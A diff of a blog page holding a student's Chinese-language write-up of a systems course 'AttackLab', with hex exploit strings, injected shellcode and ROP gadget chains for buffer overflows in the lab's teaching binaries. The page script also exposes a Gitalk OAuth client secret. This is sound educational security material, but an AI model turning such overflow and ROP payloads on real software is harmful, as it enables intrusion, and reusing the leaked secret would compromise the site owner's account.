@@ -139,10 +139,10 @@
   <!--[if lt IE 9]> <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script> <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script> <![endif]-->
 
   <!-- ga & ba script hoook -->
-  <link rel="canonical" href="https://adu2021.github.io/categories/杂谈/">
+  <link rel="canonical" href="https://adu2021.github.io/undefined/ics-lab2/">
   <title>
     
-      ADu&#39;s Blog
+      ICS-LAB2-Attack - ADu&#39;s Blog
     
   </title>
 <meta name="generator" content="Hexo 5.4.0"></head>
@@ -358,9 +358,9 @@
     }
 
     header.intro-header {
-       /*page*/
-        background-image: var(--intro-header-background-image-url-page);
-        /* background-image: url('/img/header_img/archive_bg2.jpg'); */
+       /*post*/
+        background-image: var(--intro-header-background-image-url-post);
+        /* background-image: url(''); */
       
     }
 
@@ -378,10 +378,42 @@
       <div class="row">
         <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
           
-          <div class="site-heading">
-            <h1>ADu&#39;s Blog</h1>
-            <!--<hr class="small">-->
-            <span class="subheading">你好呀~</span>
+          <div class="post-heading">
+            <div class="tags">
+              
+              <a class="tag" href="/tags/#ICS" title="ICS">ICS</a>
+              
+            </div>
+            <h1>ICS-LAB2-Attack</h1>
+            <h2 class="subheading">有些指令是需要16字节对齐的</h2>
+            <span class="meta">
+              Posted by Du Yiyang on
+              2023-01-23
+            </span>
+
+
+            
+            <!-- WordCount start -->
+            <div class="blank_box"></div>
+            <span class="meta">
+              Estimated Reading Time <span class="post-count">6</span> Minutes
+            </span>
+            <div class="blank_box"></div>
+            <span class="meta">
+              Words <span class="post-count">1.6k</span> In Total
+            </span>
+            <div class="blank_box"></div>
+            <!-- WordCount end -->
+            
+            
+            <!-- 不蒜子统计 start -->
+            <span class="meta" id="busuanzi_container_page_pv">
+              Viewed <span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span> Times
+            </span>
+            <!-- 不蒜子统计 end -->
+            
+
+
           </div>
           
         </div>
@@ -422,390 +454,301 @@
 	Friends Blog、
 	anchorjs、
 	) -->
-		<!-- Main Content -->
-<div class="container">
-  <div class="row">
+		<!-- Modify by Yu-Hsuan Yen -->
+<!-- Post Content -->
+<article>
+  <div class="container">
+    <div class="row">
+      <!-- Post Container -->
+      <div class="col-lg-8 col-lg-offset-1 col-md-10 col-md-offset-1 post-container">
+
+        <h1>ICS AttackLab Report</h1>
+<p>2022秋</p>
+<h2 id="实验原理简述">实验原理简述</h2>
+<h3 id="Code-Injection-CI">Code Injection (CI)</h3>
+<p>通过把恶意代码放在读入的 buffer 内，然后 stack overflow 把该段代码的开始地址溢出到本应存返回地址的 (%rsp) 处，即可将控制转移到注入代码处。</p>
+<h3 id="Return-Oriented-Programming-ROP">Return-Oriented Programming (ROP)</h3>
+<p>寻找形如 xx … xx c3 的机器代码（就是找 c3(ret) 结尾，因此是 return-oriented ），跳转到开始处便会一直执行到 c3 (ret) 处，这样就可以将需要执行的代码拆分成若干块（gadget），把每块的开始地址 stack overflow 从低到高写到栈顶，就能依次执行了。</p>
+<h2 id="实验过程">实验过程</h2>
+<p>下面给出每个 Task 的构造过程。</p>
+<h3 id="Task1">Task1</h3>
+<p>首先要确定 getbuf() 函数的 buffer 大小，注意到：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">0000000000401ca3</span> &lt;getbuf&gt;:</span><br><span class="line">  <span class="attribute">401ca3</span>:	f<span class="number">3</span> <span class="number">0</span>f <span class="number">1</span>e fa          	endbr<span class="number">64</span> </span><br><span class="line">  <span class="attribute">401ca7</span>:	<span class="number">48</span> <span class="number">83</span> ec <span class="number">38</span>          	sub    $<span class="number">0</span>x<span class="number">38</span>,%rsp</span><br><span class="line">  <span class="attribute">401cab</span>:	<span class="number">48</span> <span class="number">89</span> e<span class="number">7</span>             	mov    %rsp,%rdi</span><br><span class="line">  <span class="attribute">401cae</span>:	e<span class="number">8</span> b<span class="number">5</span> <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>       	callq  <span class="number">401</span>f<span class="number">68</span> &lt;Gets&gt;</span><br><span class="line">  <span class="attribute">401cb3</span>:	b<span class="number">8</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0</span>x<span class="number">1</span>,%eax</span><br><span class="line">  <span class="attribute">401cb8</span>:	<span class="number">48</span> <span class="number">83</span> c<span class="number">4</span> <span class="number">38</span>          	add    $<span class="number">0</span>x<span class="number">38</span>,%rsp</span><br><span class="line">  <span class="attribute">401cbc</span>:	c<span class="number">3</span>                   	retq  </span><br></pre></td></tr></table></figure>
+<p>可知 buffer 大小为 0x38 （56）个 byte，于是在注入前需要 padding 56 个 “00” （hex）。（这个大小是各 task 同一的）<br>
+接下来的输入就会溢出到原返回地址处。只需要找到 touch1() 的开始地址，小尾端地填写即可。对 ctarget 反汇编，找到 <code>0000000000401cbd &lt;touch1&gt;:</code> ，于是可以构造：</p>
+<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/*<span class="number"> 56 </span>个 padding<span class="number"> 00 </span>*/</span><br><span class="line">bd 1c<span class="number"> 40 </span>00<span class="number"> 00 </span>00<span class="number"> 00 </span>00 /* touch1() 开始地址 */</span><br></pre></td></tr></table></figure>
+<h3 id="Task2">Task2</h3>
+<p>touch2() 需要传入特定的 unsigned 类型参数，这就需要先注入代码修改 %rdi ，再跳转到 touch2() 的起始处。而跳转使用 ret 较为简单，于是我们设计将返回地址先 push 进栈，然后再 ret ，起到了跳转的效果。汇编设计如下：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">mov</span>    $<span class="number">0</span>x<span class="number">73</span>f<span class="number">58</span>dc<span class="number">2</span>,%edi</span><br><span class="line"><span class="attribute">pushq</span>  $<span class="number">0</span>x<span class="number">401</span>cf<span class="number">1</span></span><br><span class="line"><span class="attribute">retq</span></span><br></pre></td></tr></table></figure>
+<p>先将上述代码编译，然后 objdump 反汇编得到机器码，将对应的机器码放在 buffer 的高位，gdb 断点调试（<code>break *getbuf</code>、<code>x/i $rsp</code>）经计算得到其开始地址为 0x556678a5 ，于是 overflow 的位置填上这个地址即可实现目标。找到 <code>0000000000401cf1 &lt;touch2&gt;:</code> ，设计如下：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/* 45 个 padding &quot;00&quot; */</span></span><br><span class="line">bf c2 <span class="number">8</span>d f5 <span class="number">73</span>  <span class="regexp">/* mov    $0x73f58dc2,%edi */</span></span><br><span class="line"><span class="number">68</span> f1 <span class="number">1</span>c <span class="number">40</span> <span class="number">00</span>  <span class="regexp">/* pushq  $0x401cf1 */</span></span><br><span class="line">c3              <span class="regexp">/* retq   */</span></span><br><span class="line">a5 <span class="number">78</span> <span class="number">66</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="regexp">/* 第一行注入代码的地址 */</span></span><br></pre></td></tr></table></figure>
+<h3 id="Task3">Task3</h3>
+<p>touch3() 需要传入字符串，也就是需要注入 cookie 之后把首地址作为参数传进去。注意 cookie 需要注入到 buffer 外，不然会被 hexmatch 和 strncmp 压栈洗掉。其他跟 Task2 一样。找到 <code>0000000000401e16 &lt;touch3&gt;:</code> 设计如下：</p>
+<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/*<span class="number"> 43 </span>个 padding &quot;00&quot; */</span><br><span class="line">48 c7 c7 b8<span class="number"> 78 </span>66<span class="number"> 55 </span> /* mov    $0x556678b8,%rdi */</span><br><span class="line">68<span class="number"> 16 </span>1e<span class="number"> 40 </span>00  /* pushq  $0x401cf1 */</span><br><span class="line">c3              /* retq   */</span><br><span class="line">a3<span class="number"> 78 </span>66<span class="number"> 55 </span>00<span class="number"> 00 </span>00 00</span><br><span class="line">37<span class="number"> 33 </span>66<span class="number"> 35 </span>38<span class="number"> 64 </span>63<span class="number"> 32 </span>00 /* 73f58dc2 */</span><br></pre></td></tr></table></figure>
+<h3 id="Task4">Task4</h3>
+<p>rtarget 一系列保护措施阻止了我们直接注入代码，于是需要找 rtarget 里面现成的 （后面有 c3 ）的机器码片段拼凑，实现将 cookie 放到 %rdi 的效果。直接的思路是 movl cookie 这样的，但显然原始代码里不大可能直接有 cookie 这个数，所以需要另辟蹊径：把 cookie 注入到栈里面，然后通过 pop 读到寄存器里，这样就摆脱了对机器码中出现 cookie 的依赖。反汇编 rtarget 后找到<code>0000000000401cf1 &lt;touch2&gt;:</code>，设计如下：</p>
+<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/*<span class="number"> 56 </span>个 padding<span class="number"> 00 </span>*/</span><br><span class="line">de 1e<span class="number"> 40 </span>00<span class="number"> 00 </span>00<span class="number"> 00 </span>00     /* 0x401ede : pop %rax ; ret */</span><br><span class="line">c2 8d f5<span class="number"> 73 </span>00<span class="number"> 00 </span>00<span class="number"> 00 </span>    /* 0x73f58dc2 */</span><br><span class="line">e9 1e<span class="number"> 40 </span>00<span class="number"> 00 </span>00<span class="number"> 00 </span>00     /* 0x401ee9 : movq %rax, %rdi ; ret */</span><br><span class="line">f1 1c<span class="number"> 40 </span>00<span class="number"> 00 </span>00<span class="number"> 00 </span>00     /* 0x401cf1 : touch2() */</span><br></pre></td></tr></table></figure>
+<h3 id="Task5">Task5</h3>
+<p>注入 cookie 字符串后必须要传入它的地址，所以需要通过 mov 指令取得 %rsp ，然而 cookie 地址和 %rsp 总是有一个 offset ，所以还需要做修正。注意到有 add_xy 这个函数，于是要想办法把这个 offset 放到 %rsi ，然后把 %rsp 放到 %rdi ，再调用 add_xy, 最后把返回值（正确地 cookie 地址）从 %rax 放到 %rdi 。</p>
+<p>在上面的思路下，就各种找和 %rsp ，%rdi，%rsi 相关的 mov 指令（后面跟着 c3 的）。最终有如下的设计：</p>
+<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/*<span class="number"> 56 </span>个 padding<span class="number"> 00 </span>*/</span><br><span class="line">9c 1f<span class="number"> 40 </span>00<span class="number"> 00 </span>00<span class="number"> 00 </span>00     /* 0x401f9c : nop */</span><br><span class="line">a5 1f<span class="number"> 40 </span>00<span class="number"> 00 </span>00<span class="number"> 00 </span>00     /* 0x401fa5 : movq %rsp, %rax; nop ; ret */</span><br><span class="line">e9 1e<span class="number"> 40 </span>00<span class="number"> 00 </span>00<span class="number"> 00 </span>00     /* 0x401ee9 : movq %rax, %rdi ; ret */</span><br><span class="line">32<span class="number"> 17 </span>40<span class="number"> 00 </span>00<span class="number"> 00 </span>00<span class="number"> 00 </span>    /* 0x401732 : pop %rsi ; ret; */</span><br><span class="line">30<span class="number"> 00 </span>00<span class="number"> 00 </span>00<span class="number"> 00 </span>00<span class="number"> 00 </span>    /* hex for ull(48) (offset) */</span><br><span class="line">27 1f<span class="number"> 40 </span>00<span class="number"> 00 </span>00<span class="number"> 00 </span>00     /* 0x401f27 : lea (%rdi,%rsi,1),%rax ; ret */</span><br><span class="line">e9 1e<span class="number"> 40 </span>00<span class="number"> 00 </span>00<span class="number"> 00 </span>00     /* 0x401ee9 : movq %rax, %rdi ; ret */</span><br><span class="line">16 1e<span class="number"> 40 </span>00<span class="number"> 00 </span>00<span class="number"> 00 </span>00     /* 0x401e16 : touch3() */</span><br><span class="line">37<span class="number"> 33 </span>66<span class="number"> 35 </span>38<span class="number"> 64 </span>63<span class="number"> 32 </span>00  /* 73f58dc2 (cookie) */</span><br></pre></td></tr></table></figure>
+<p>这个 Task 中间遇到了不少困难，后面讲。</p>
+<h2 id="遇到的困难及解决方案">遇到的困难及解决方案</h2>
+<h3 id="Task2-2">Task2</h3>
+<p>Task2 中最开始是采用了类似 ROP 的那种转移控制的方式：<code> mov    $0x73f58dc2,%edi</code> 然后直接 <code>retq</code> ，并把 touch2() 的地址 overflow 到了栈上比第一个返回地址更高的位置。但因为一些奇妙的原因，这样做会出现以下的 Segmentation Fault：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Type</span> string:Touch<span class="number">2</span>!: You called touch<span class="number">2</span>(<span class="number">0</span>x<span class="number">73</span>f<span class="number">58</span>dc<span class="number">2</span>)</span><br><span class="line"><span class="attribute">Valid</span> solution for level <span class="number">2</span> with target ctarget</span><br><span class="line"><span class="attribute">Ouch</span>!: You caused a segmentation fault!</span><br><span class="line"><span class="attribute">Better</span> luck next time</span><br></pre></td></tr></table></figure>
+<p>可能是 overflow 过多造成的副作用，改用上面那种把返回值也 push 进栈的方式解决。</p>
+<h3 id="Task4-2">Task4</h3>
+<p>一开始就在反汇编得到的代码里各种搜索形如 “movq %rax, %rdi” 的字样，发现这本来就很困难了，还没有考虑后面跟一个 ret 的要求。后来发现需要找的机器码是可以从已有的一条指令中间开始的，比如观察下面这个函数</p>
+<pre>
+0000000000401ee3 <setval_348>:
+  401ee3:	f3 0f 1e fa          	        endbr64 
+  401ee7:	c7 07 <b> 48 89 c7 c3</b>    	movl   $0xc3c78948,(%rdi)
+  401eed:	c3                   	        retq   
+</pre>
+<p>这里的 <code>48 89 c7 c3</code> 就恰好是 <code>movq %rax, %rdi</code> 和 <code>ret</code> 的含义，因此我们只需要跳转到这条指令中间 （0x401ee<strong>9</strong>），就能实现与原文截然不同的效果。</p>
+<h3 id="Task5-2">Task5</h3>
+<p>首先是这个代码片段构造的比较长，然后需要调整合适的 offset。以及一开始没有找到 <code>pop %rsi</code> 的 gadget 导致设计的很地狱。</p>
+<p>最难以解决的问题是设计完成后，成功的跑进了 touch3() ，而且 gdb 检查各种参数、位置都是对的，但就是在调 hexmatch() 函数的时候会跑到 sprintf() 里面段错误。百思不得其解，遂找助教求助。发现是对齐的问题：栈指针在跑到 movaps 没有16位对齐（其实是规定了 “input argument area” 需要十六位对齐）。自己 gdb 跑了下，发现总是差 8 ，于是找了个 nop 的 gadget ，把它的地址放到了构造的地址序列前面，相当于在这里为栈提供了一个 8 的 offset ，就实现16位对齐了。</p>
+
+
+        <hr>
+        <!-- Pager -->
+        <ul class="pager">
+          
+          <li class="previous">
+            <a href="/undefined/ics-lab3/" data-toggle="tooltip" data-placement="top" title="ICS-LAB3-Malloc">&larr; Previous Post</a>
+          </li>
+          
+          
+          <li class="next">
+            <a href="/undefined/ics-lab1/" data-toggle="tooltip" data-placement="top" title="ICS-LAB1-Coroutine">Next Post &rarr;</a>
+          </li>
+          
+        </ul>
+
+        
+        <!-- tip start -->
+        <!-- tip -->
+<!-- tip start -->
+<div class="tip">
+  <p>
+    
+      If you like this blog or find it useful for you, you are welcome to comment on it. You are also welcome to share this blog, so that more people can participate in it. If the images used in the blog infringe your copyright, please contact the author to delete them. Thank you !
+    
+  </p>
+</div>
+<!-- tip end -->
+
+        <!-- tip end -->
+        
+
+        
+        <!-- Sharing Srtart -->
+        <!-- Social Social Share Post -->
+<!-- Docs:https://github.com/overtrue/share.js -->
+
+<div class="social-share" data-initialized="true" data-disabled="tencent ,douban ,qzone ,linkedin ,facebook ,google ,diandian" data-wechat-qrcode-helper="" align="center">
+  <ul class="list-inline text-center social-share-ul">
+    <li class="social-share-li">
+      <a target="_blank" class="social-share-icon icon-twitter">
+        <i class="fa fa-twitter fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+    <li class="social-share-li">
+      <a class="social-share-icon icon-wechat">
+        <i class="fa fa-weixin fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+    <li class="social-share-li">
+      <a target="_blank" class="social-share-icon icon-weibo">
+        <i class="fa fa-weibo fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+    <li class="social-share-li">
+      <a target="_blank" class="social-share-icon icon-qq">
+        <i class="fa fa-qq fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+    <li class="social-share-li">
+      <a target="_blank" class="social-share-icon" href="mailto:?subject=ICS-LAB2-Attack&body=Hi,I found this website and thought you might like it https://adu2021.github.io/undefined/ics-lab2/">
+        <i class="fa fa-envelope fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+  </ul>
+</div>
+
+<!-- css & js -->
+<!-- <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css"> -->
+<script defer="defer" async="true" src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+
+        <!-- Sharing End -->
+        
+        <hr>
+
+        <!-- comments start -->
+        <!-- 1. gitalk comment -->
+
+  <!-- gitalk start -->
+  <!-- Docs:https://github.com/gitalk/gitalk/blob/master/readme-cn.md -->
+
+  <div id="gitalk-container"></div>
+
+  
+    <!-- <script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.js"></script> -->
+    <script src="/js/comment/gitalk.js"></script>
+  
+
+  <script>
+    var gitalk = new Gitalk({
+      clientID: 'ff75338a1add7ef1c2c6',
+      clientSecret: '0d3daff08fa21827ac90b2682d812688a20635ee',
+      repo: 'adu2021.github.io',
+      owner: 'ADu2021',
+      admin: 'ADu2021',
+      id: 'Mon Jan 23 2023 20:38:00 GMT+0000', // Ensure uniqueness and length less than 50
+      distractionFreeMode: false, // Facebook-like distraction free mode
+      perPage: 10,
+      pagerDirection: 'last',
+      createIssueManually: false,
+      language: 'zh-CN',
+      proxy: 'https://shielded-brushlands-08810.herokuapp.com/https://github.com/login/oauth/access_token'
+    });
+    gitalk.render('gitalk-container');
+
+    var gtFolded = () => {
+      setTimeout(function () {
+        let markdownBody = document.getElementsByClassName("markdown-body");
+        let list = Array.from(markdownBody);
+        list.forEach(item => {
+          if (item.clientHeight > 250) {
+            item.classList.add('gt-comment-body-folded');
+            item.style.maxHeight = '250px';
+            item.title = 'Click to Expand';
+            item.onclick = function () {
+              item.classList.remove('gt-comment-body-folded');
+              item.style.maxHeight = '';
+              item.title = '';
+              item.onclick = null;
+            };
+          }
+        })
+      }, 800);
+    }
+  </script>
+
+  <!-- gitalk end -->
+
+
+<!-- 2. gitment comment -->
+
+
+<!-- 3. disqus comment -->
+
+
+        <!-- comments end -->
+        <hr>
+
+      </div>
+
+      <!-- Catalog: Tabe of Content -->
+      <!-- Table of Contents -->
+
+    
+      <aside id="sidebar">
+        <div id="toc" class="toc-article">
+        <strong class="toc-title">Contents</strong>
+        
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">ICS AttackLab Report</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%AE%9E%E9%AA%8C%E5%8E%9F%E7%90%86%E7%AE%80%E8%BF%B0"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">实验原理简述</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#Code-Injection-CI"><span class="toc-nav-number">1.1.1.</span> <span class="toc-nav-text">Code Injection (CI)</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#Return-Oriented-Programming-ROP"><span class="toc-nav-number">1.1.2.</span> <span class="toc-nav-text">Return-Oriented Programming (ROP)</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">实验过程</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#Task1"><span class="toc-nav-number">1.2.1.</span> <span class="toc-nav-text">Task1</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#Task2"><span class="toc-nav-number">1.2.2.</span> <span class="toc-nav-text">Task2</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#Task3"><span class="toc-nav-number">1.2.3.</span> <span class="toc-nav-text">Task3</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#Task4"><span class="toc-nav-number">1.2.4.</span> <span class="toc-nav-text">Task4</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#Task5"><span class="toc-nav-number">1.2.5.</span> <span class="toc-nav-text">Task5</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E9%81%87%E5%88%B0%E7%9A%84%E5%9B%B0%E9%9A%BE%E5%8F%8A%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">遇到的困难及解决方案</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#Task2-2"><span class="toc-nav-number">1.3.1.</span> <span class="toc-nav-text">Task2</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#Task4-2"><span class="toc-nav-number">1.3.2.</span> <span class="toc-nav-text">Task4</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#Task5-2"><span class="toc-nav-number">1.3.3.</span> <span class="toc-nav-text">Task5</span></a></li></ol></li></ol></li></ol>
+        
+        </div>
+      </aside>
     
 
-    <!-- USE SIDEBAR -->
-    <!-- Post Container -->
-    <div class="
+
+
+      <!-- Sidebar Container -->
+      <div class="
                 col-lg-8 col-lg-offset-1
-                col-md-8 col-md-offset-1
-                col-sm-12
-                col-xs-12
-                post-container
-            ">
+                col-md-10 col-md-offset-1
+                sidebar-container">
 
-      <!-- Main Content -->
-<div class="container">
-  <div class="row">
-    <div class="col-lg-8 col-lg-offset-0 col-md-10 col-md-offset-1">
-      <!-- 归档列表 -->
-
-      
-
-      <!-- 归档列表 -->
-      
-      <div class="one-tag-list">
-        <span class="fa fa-calendar-times-o listing-seperator" id="2023">
-          <span class="tag-text">2023</span>
-        </span>
-        <ul>
-          
-          <li>
-            01-23
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/undefined/ics-lab3/" style="color: #0085a1">
-              <span>
-                ICS-LAB3-Malloc
-                
-                -- 
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            01-23
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/undefined/ics-lab2/" style="color: #0085a1">
-              <span>
-                ICS-LAB2-Attack
-                
-                -- 
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            01-23
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/undefined/ics-lab1/" style="color: #0085a1">
-              <span>
-                ICS-LAB1-Coroutine
-                
-                -- 
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            01-16
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/undefined/summary2022fall/" style="color: #0085a1">
-              <span>
-                大二上学期总结
-                
-                -- 
-                
-              </span>
-            </a>
-          </li>
-          
-        </ul>
-      </div>
-      
-      <div class="one-tag-list">
-        <span class="fa fa-calendar-times-o listing-seperator" id="2022">
-          <span class="tag-text">2022</span>
-        </span>
-        <ul>
-          
-          <li>
-            09-18
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/undefined/20220918/" style="color: #0085a1">
-              <span>
-                数学建模小记
-                
-                -- 
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            09-06
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/undefined/2022javaDebug/" style="color: #0085a1">
-              <span>
-                Java小学期实验报告
-                
-                -- 
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            08-28
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/undefined/Java-Android/" style="color: #0085a1">
-              <span>
-                Java&Android Debug Log
-                
-                -- 
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            08-24
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/undefined/test/" style="color: #0085a1">
-              <span>
-                Nice to meet you
-                
-                -- 
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            08-10
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/undefined/message-to-SDSZer/" style="color: #0085a1">
-              <span>
-                新生寄语
-                
-                -- 
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            08-05
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/undefined/summaryGrade1/" style="color: #0085a1">
-              <span>
-                大一学年总结
-                
-                -- 
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            06-12
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/undefined/writing-communication/" style="color: #0085a1">
-              <span>
-                删帖风云——社交媒体管控下网络舆论的兴亡
-                
-                -- 
-                
-              </span>
-            </a>
-          </li>
-          
-        </ul>
-      </div>
-      
-    </div>
-  </div>
-</div>
-
-
-      <!-- 如果开启评论功能 -->
-      
-    </div>
-
-    <!-- Sidebar Container -->
-<div class="
-    col-lg-3 col-lg-offset-0
-    col-md-3 col-md-offset-0
-    col-sm-12
-    col-xs-12
-    sidebar-container
-">
-    
-        <!-- Visitors -->
-<h5><a href="/">VISITORS</a></h5>
-
-<div class="widget">
-  <span>
-    Viewed <b><i><span id="busuanzi_value_site_pv"><i class="fa fa-spinner fa-spin"></i></span></i></b> Times
-  </span>
-  <br />
-  <span>
-    <b><i><span id="busuanzi_value_site_uv"><i class="fa fa-spinner fa-spin"></i></span></i></b> Visitors In Total
-  </span>
-</div>
-
-
-        <hr>
-    
         <!-- Featured Tags -->
+        
+        <section>
+          <!-- no hr -->
+          <h5>
+            <a href="/tags/">FEATURED TAGS</a>
+          </h5>
+          <div class="tags">
+            
+            <a class="tag" href="/tags/#ICS" title="ICS">ICS</a>
+            
+          </div>
+        </section>
+        
 
-<section>
-  <h5><a href="/tags/">FEATURED TAGS</a></h5>
-  <div class="tags">
-    
-    
-    <a href="/tags/#数学建模" title="数学建模" rel="1">数学建模</a>
-    
-    
-    
-    <a href="/tags/#Java" title="Java" rel="2">Java</a>
-    
-    
-    
-    <a href="/tags/#Android" title="Android" rel="2">Android</a>
-    
-    
-    
-    <a href="/tags/#ICS" title="ICS" rel="3">ICS</a>
-    
-    
-    
-    <a href="/tags/#总结" title="总结" rel="2">总结</a>
-    
-    
-    
-    <a href="/tags/#课程论文" title="课程论文" rel="1">课程论文</a>
-    
-    
+        <!-- Friends Blog -->
+        
+        <hr>
+        <h5>FRIENDS</h5>
+        <ul class="list-inline">
+
+          
+        </ul>
+        
+      </div>
+    </div>
   </div>
-</section>
+</article>
 
 
-        <hr>
-    
-        <!-- Short About -->
-<section class="visible-md visible-lg">
-  <h5><a href="/about/">ABOUT ME</a></h5>
-  <div class="short-about">
 
-    
-    <img id="avatar_pic" src="/img/avatar/code-face.jpg" alt="avatar_pic" style="box-shadow: 5px 5px 10px 5px rgba(0, 0, 0, .5);
-    -moz-box-shadow: 5px 5px 10px 5px rgba(0, 0, 0, .5);
-    -webkit-box-shadow: 5px 5px 10px 5px rgba(0, 0, 0, .5);" />
-    
+<!-- anchorjs start -->
+<!-- async load function -->
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script type="text/javascript">
+  // async load function
+  function async (u, c) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) {
+      o.addEventListener('load', function(e) {
+        c(null, e);
+      }, false);
+    }
+    s.parentNode.insertBefore(o, s);
+  };
+</script>
+<script type="text/javascript">
+  //anchor-js, Doc:http://bryanbraun.github.io/anchorjs/
+  async ("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js", function() {
+    anchors.options = {
+      visible: 'hover',
+      placement: 'left',
+      // icon: 'ℬ'
+      icon: '❡'
+    };
+    anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+  });
+</script>
+<style>
+  /* place left on bigger screen */
+  @media all and (min-width: 800px) {
+    .anchorjs-link {
+      position: absolute;
+      left: -0.75em;
+      font-size: 1.1em;
+      margin-top: -0.1em;
+    }
+  }
+</style>
 
-    
-    <p>That&#39;s interesting</p>
-    
+<!-- anchorjs end -->
 
-    <!-- SNS Link -->
-    <ul class="list-inline">
-      
-
-      
-      <li>
-        <a target="_blank" href="https://github.com/ADu2021">
-          <span class="fa-stack fa-lg">
-            <i class="fa fa-circle fa-stack-2x"></i>
-            <i class="fa fa-github fa-stack-1x fa-inverse"></i>
-          </span>
-        </a>
-      </li>
-      
